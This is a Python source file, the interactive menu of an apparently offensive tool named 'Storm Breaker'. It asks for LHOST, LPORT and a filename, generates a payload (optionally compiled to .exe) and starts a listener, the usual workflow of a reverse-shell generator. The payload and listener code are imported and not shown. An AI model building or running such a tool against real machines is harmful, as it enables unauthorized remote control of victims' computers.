from payload import Payload
from listener import listener


def ask_quit():
    while True:
        cont = input("      [*] Do you want to continue? ([y]es / [n]o): ").strip().lower()
        if cont == "n" or cont == "no":
            return True
            break
        elif cont == "y" or cont == "yes":
            return False
            break
        else:
            print("[-] Invalid Argument")


def print_options():
    print("""
      1) Create A Payload
      2) Setup Listener
      3) Quit
    """)


def main():
    try:
        print("""
 _____ _                        ______                _             
/  ___| |                       | ___ \              | |            
\ `--.| |_ ___  _ __ _ __ ___   | |_/ /_ __ ___  __ _| | _____ _ __ 
 `--. \ __/ _ \| '__| '_ ` _ \  | ___ \ '__/ _ \/ _` | |/ / _ \ '__|
/\__/ / || (_) | |  | | | | | | | |_/ / | |  __/ (_| |   <  __/ |   
\____/ \__\___/|_|  |_| |_| |_| \____/|_|  \___|\__,_|_|\_\___|_|
                                                    Authors: ninjahacker123, WoutVos\n
        """)
        while True:
            print_options()
            opt = input(f"      <<StormBreaker>> ")
            if opt == "1":
                lhost = input("\n        [*] Enter LHOST: ")
                lport = input("        [*] Enter LPORT: ")
                filename = input("        [*] Enter Filename: ")
                compile_file = input("        [*] Do you want to convert file from .py to .exe: (y[es] / n[o]): ").lower()
                payload = Payload(lhost, lport, filename)
                if compile_file == "y" or compile_file == "yes":
                    payload.create_payload(True)
                else:
                    payload.create_payload()
                quit = ask_quit()
                if quit:
                    print("\n   Thanks for using Storm Breaker!\n")
                    break

            elif opt == "2":
                listener()
                quit = ask_quit()
                if quit:
                    print("\n   Thanks for using Storm Breaker!\n")
                    break
            elif opt == "3":
                print("\n   Thanks for using Storm Breaker!\n")
                break
            else:
                print("\n[-] Invalid Option!\n")
    except KeyboardInterrupt:
        print("\nQuitting Storm Breaker...\n")


if __name__ == "__main__":
    main()
